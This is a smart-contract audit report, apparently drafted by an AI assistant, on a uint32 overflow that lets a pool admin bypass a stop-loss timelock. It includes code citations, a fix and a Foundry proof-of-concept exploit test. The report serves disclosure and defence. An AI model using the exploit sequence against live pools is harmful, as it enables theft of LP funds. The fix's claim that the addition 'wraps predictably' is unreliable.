The code confirms the vulnerability. Let me verify all the key claims against the actual source:

1. **Overflow in `_afterTimelock`** (L297-299): `uint32(block.timestamp + oracleStopLossConfig[pool_].timelock)` — addition in `uint256`, then truncated. Confirmed.

2. **No timelock validation in `initialize`** (L56-58): Only `_validateDrawdown` and `_validateDecay` are called; `timelock` is stored raw. Confirmed.

3. **No timelock validation in `proposeOracleStopLossTimelock`** (L78-84): `newTimelock` is stored directly into `sched.pendingTimelock` with no upper-bound check. Confirmed.

4. **`_requireElapsed` passes when `executeAfter` is in the past** (L301-303): `if (block.timestamp < executeAfter) revert` — if `executeAfter` wraps below `block.timestamp`, the check passes unconditionally. Confirmed.

5. **All four propose paths use `_afterTimelock`** (L80, L106, L133, L162): All confirmed.

The overflow arithmetic is correct: `uint32(1_753_000_000 + 4_294_967_295)` = `uint32(6_047_967_295)` = `1_752_999_999`, which is 1 second in the past. The attack requires the pool admin to wait through the current timelock once (to execute the overflowing timelock value), after which all future proposals are immediately executable.

---

Audit Report

## Title
`uint32` Overflow in `_afterTimelock` Allows Pool Admin to Bypass Stop-Loss Timelock — (`metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol`)

## Summary

`_afterTimelock` computes `uint32(block.timestamp + oracleStopLossConfig[pool_].timelock)`. When `timelock` is set to any value exceeding `type(uint32).max − block.timestamp` (≈ 2.54 billion seconds at current timestamps), the `uint256` sum overflows the `uint32` cast and wraps to a value already in the past. All four `propose*` paths store this wrapped value as `executeAfter`, and `_requireElapsed` passes immediately, allowing the pool admin to execute any stop-loss parameter change in the same block as the proposal — with zero LP reaction time.

## Finding Description

`_afterTimelock` at L297-299 performs the addition in `uint256` space and then silently truncates:

```solidity
function _afterTimelock(address pool_) private view returns (uint32) {
    return uint32(block.timestamp + oracleStopLossConfig[pool_].timelock);
}
``` [1](#0-0) 

The `timelock` field is `uint32` in `PoolStopLossConfig` but no upper-bound validation is applied in `initialize`:

```solidity
(uint32 drawdownE6, uint32 decayPerSecondE8, uint32 timelock) = abi.decode(data, (uint32, uint32, uint32));
_validateDrawdown(drawdownE6);
_validateDecay(decayPerSecondE8);
// timelock stored without validation
``` [2](#0-1) 

Nor in `proposeOracleStopLossTimelock`: [3](#0-2) 

The guard `_requireElapsed` at L301-303 passes unconditionally when `executeAfter` wraps below `block.timestamp`: [4](#0-3) 

All four proposal paths are affected: [5](#0-4) [6](#0-5) [7](#0-6) [8](#0-7) 

**Overflow arithmetic (July 2025):** `uint32(1_753_000_000 + 4_294_967_295)` = `uint32(6_047_967_295)` = `1_752_999_999` — one second in the past.

## Impact Explanation

The timelock is the sole LP-protection mechanism against sudden stop-loss parameter changes by the pool admin. With the overflow active, the pool admin can propose `drawdownE6 = 0` (disabling the stop-loss entirely) and execute it in the same block. The `OracleStopLossTriggered` revert that would otherwise block value-leaking swaps is silenced, and LPs receive no advance notice and cannot withdraw before their position is drained. This is a direct LP principal loss path and constitutes an admin-boundary break where the pool admin bypasses a timelock that LPs were relying on.

## Likelihood Explanation

The pool admin must first install an overflowing `timelock` value, which requires waiting through the current timelock once. After that single wait, all future proposals on that pool are immediately executable with no further delay. A `timelock` of `type(uint32).max` (≈ 136 years) appears to be an extremely conservative protective setting, yet it produces an `executeAfter` already in the past — making the deceptive setup plausible.

## Recommendation

Cast `block.timestamp` to `uint32` **before** adding the timelock, so the addition stays within `uint32` range and wraps predictably (matching the pattern used in similar timelocked systems):

```diff
 function _afterTimelock(address pool_) private view returns (uint32) {
-    return uint32(block.timestamp + oracleStopLossConfig[pool_].timelock);
+    return uint32(block.timestamp) + oracleStopLossConfig[pool_].timelock;
 }
```

Additionally, add an upper-bound validation on `timelock` in both `initialize` and `proposeOracleStopLossTimelock` (e.g., `require(timelock <= 365 days)`) to prevent any future overflow path and enforce a meaningful maximum delay.

## Proof of Concept

```solidity
function test_timelockOverflowBypassesDelay() public {
    OracleValueStopLossExtension freshExt = new OracleValueStopLossExtension(address(factoryStub));
    MockExtensionExtsloadPool freshPool = new MockExtensionExtsloadPool(address(factoryStub), MIN_SHARES);
    factoryStub.setPoolAdmin(address(freshPool), admin);
    vm.prank(address(factoryStub));
    freshExt.initialize(address(freshPool), abi.encode(uint32(500_000), uint32(0), uint32(7 days)));

    vm.startPrank(admin);

    // Step 1: propose timelock = type(uint32).max (looks like 136-year protection).
    freshExt.proposeOracleStopLossTimelock(address(freshPool), type(uint32).max);
    vm.warp(block.timestamp + 7 days); // wait current 7-day timelock once
    freshExt.executeOracleStopLossTimelock(address(freshPool));

    // Step 2: propose drawdown = 0 (disables stop-loss).
    // _afterTimelock now returns uint32(block.timestamp + type(uint32).max) which wraps to the past.
    freshExt.proposeOracleStopLossDrawdown(address(freshPool), 0);

    // Step 3: execute in the SAME block — no warp needed.
    freshExt.executeOracleStopLossDrawdown(address(freshPool));

    (uint32 dd,,,) = freshExt.oracleStopLossConfig(address(freshPool));
    assertEq(dd, 0); // stop-loss silently disabled with zero LP notice
    vm.stopPrank();
}
```

### Citations

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L56-62)
```text
    (uint32 drawdownE6, uint32 decayPerSecondE8, uint32 timelock) = abi.decode(data, (uint32, uint32, uint32));
    _validateDrawdown(drawdownE6);
    _validateDecay(decayPerSecondE8);

    oracleStopLossConfig[pool] = PoolStopLossConfig({
      drawdownE6: drawdownE6, decayPerSecondE8: decayPerSecondE8, timelock: timelock, initialized: true
    });
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L78-84)
```text
  function proposeOracleStopLossTimelock(address pool_, uint32 newTimelock) external onlyPoolAdmin(pool_) {
    PoolStopLossSchedule storage sched = _initializedSchedule(pool_);
    uint32 executeAfter = _afterTimelock(pool_);
    sched.pendingTimelock = newTimelock;
    sched.pendingTimelockExecuteAfter = executeAfter;
    emit OracleStopLossTimelockProposed(pool_, newTimelock, executeAfter);
  }
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L106-106)
```text
    uint32 executeAfter = _afterTimelock(pool_);
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L133-133)
```text
    uint32 executeAfter = _afterTimelock(pool_);
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L162-162)
```text
    uint32 executeAfter = _afterTimelock(pool_);
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L297-299)
```text
  function _afterTimelock(address pool_) private view returns (uint32) {
    return uint32(block.timestamp + oracleStopLossConfig[pool_].timelock);
  }
```

**File:** metric-periphery/contracts/extensions/OracleValueStopLossExtension.sol (L301-303)
```text
  function _requireElapsed(uint32 executeAfter) private view {
    if (block.timestamp < executeAfter) revert OracleStopLossTimelockNotElapsed(executeAfter, block.timestamp);
  }
```
